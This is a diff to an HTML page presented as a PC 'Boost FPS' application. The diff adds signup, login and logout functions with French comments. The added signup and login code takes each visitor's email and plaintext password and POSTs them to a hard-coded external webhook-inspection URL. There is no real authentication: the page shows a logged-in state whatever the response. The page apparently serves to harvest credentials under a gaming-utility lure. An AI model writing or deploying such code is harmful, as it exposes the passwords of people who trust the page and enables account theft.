@@ -7,6 +7,7 @@
     <title>Boost FPS - Application PC</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
+        /* Style de base */
         * {
             margin: 0;
             padding: 0;
@@ -337,6 +338,7 @@
     <script>
         const webhookUrl = "https://play.svix.com/in/e_M4lDWp8dx4feIfypDfe70NF82TN/";
 
+        // Fonction pour afficher une frame spécifique
         function showFrame(frameId) {
             const frames = document.querySelectorAll('.frame');
             frames.forEach(frame => {
@@ -345,14 +347,73 @@
             document.getElementById(frameId).classList.add('active');
         }
 
+        // Fonction pour masquer toutes les frames
         function hideAllFrames() {
             const frames = document.querySelectorAll('.frame');
             frames.forEach(frame => {
                 frame.classList.remove('active');
             });
         }
-        
-        // Connexion et déconnexion à gérer comme expliqué plus haut...
+
+        // Fonction d'inscription
+        function signup() {
+            const email = document.getElementById('signup-email').value;
+            const password = document.getElementById('signup-password').value;
+
+            // Envoi des données au webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    action: 'signup'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                showFrame('login-frame');
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Fonction de connexion
+        function login() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+
+            // Envoi des données au webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    action: 'login'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                document.getElementById('login-link').style.display = 'none';
+                document.getElementById('signup-link').style.display = 'none';
+                document.getElementById('logout-link').style.display = 'block';
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Fonction de déconnexion
+        function logout() {
+            // Logique pour gérer la déconnexion (en général, cela supprime les cookies/session)
+            document.getElementById('login-link').style.display = 'inline-block';
+            document.getElementById('signup-link').style.display = 'inline-block';
+            document.getElementById('logout-link').style.display = 'none';
+        }
     </script>
 
 </body>
